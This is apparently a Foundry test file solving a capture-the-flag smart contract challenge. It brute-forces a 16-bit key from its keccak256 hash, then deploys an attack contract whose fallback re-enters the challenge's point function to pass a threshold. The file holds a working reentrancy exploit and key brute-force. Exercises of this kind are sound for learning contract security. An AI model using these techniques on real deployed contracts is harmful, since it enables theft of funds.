// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {ChallengeTwo} from "../src/ChallengeTwo.sol";

contract ChallengeTwoTest is Test {
    ChallengeTwo public challenge;
    address public player = makeAddr("player");
    string public constant PLAYER_NAME = "Gifftybabe"; // Set to Gifftybabe

    function setUp() public {
        challenge = new ChallengeTwo();
        vm.startPrank(player);
    }

    function test_CompleteChallenge() public {
        // Step 1: Find the correct key
        uint16 key = findKey();
        challenge.passKey(key);
        
        // Step 2: Get enough points using the attack contract
        Attack attack = new Attack(address(challenge), PLAYER_NAME);
        (bool success,) = address(attack).call(
            abi.encodeWithSignature("initiateAttack()")
        );
        require(success, "Attack failed");
        
        // Step 3: Add name to champions
        challenge.addYourName();
        
        // Verify completion
        string[] memory winners = challenge.getAllwiners();
        assertEq(winners[winners.length - 1], PLAYER_NAME);
    }
    
    function findKey() internal returns (uint16) {
        for (uint16 i = 0; i < type(uint16).max; i++) {
            if (keccak256(abi.encode(i)) == 0xd8a1c3b3a94284f14146eb77d9b0decfe294c3ba72a437151caae86c3c8b2070) {
                console2.log("Found key:", i);
                return i;
            }
        }
        revert("Key not found");
    }
}

contract Attack {
    ChallengeTwo public challenge;
    uint public count;
    string public playerName;
    
    constructor(address _challenge, string memory _playerName) {
        challenge = ChallengeTwo(_challenge);
        playerName = _playerName;
    }

    function initiateAttack() external {
        // Start the reentrancy chain with Gifftybabe as the name
        challenge.getENoughPoint(playerName);
    }
    
    fallback() external {
        if (count < 3) {
            count++;
            challenge.getENoughPoint(playerName);
        }
    }
}